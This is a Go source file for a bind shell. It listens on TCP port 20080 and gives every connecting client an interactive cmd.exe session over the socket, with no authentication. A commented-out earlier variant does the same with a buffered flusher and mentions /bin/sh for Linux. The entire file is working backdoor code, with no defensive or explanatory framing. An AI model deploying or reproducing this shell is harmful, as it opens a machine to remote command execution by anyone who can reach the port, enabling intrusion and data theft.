package main

import (
	"io"
	"log"
	"net"
	"os/exec"
)

//! Forcing buffer to Flush
// type Flusher struct {
// 	w *bufio.Writer
// }

// func NewFlusher(w io.Writer) *Flusher {
// 	return &Flusher{
// 		w: bufio.NewWriter(w),
// 	}
// }

// func (f *Flusher) Write(b []byte) (int, error) {
// 	count, err := f.w.Write(b)
// 	if err != nil {
// 		return -1, err
// 	}
// 	if err := f.w.Flush(); err != nil {
// 		return -1, err
// 	}
// 	return count, err
// }

// func handle(conn net.Conn) {
// 	cmd := exec.Command("cmd.exe", "-i") // "/bin/sh" for linux
// 	cmd.Stdin = conn

// 	cmd.Stdout = NewFlusher(conn)
// 	if err := cmd.Run(); err != nil {
// 		log.Fatalln(err)
// 	}
// }

// ! Using Go's in-memory pipe
func handle(conn net.Conn) {
	cmd := exec.Command("cmd.exe", "-i")
	rp, wp := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = wp
	go io.Copy(conn, rp)
	cmd.Run()
	conn.Close()
}

func main() {
	listener, err := net.Listen("tcp", ":20080")
	if err != nil {
		log.Fatalln(err)
	}
	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln(err)
		}
		go handle(conn)
	}
}
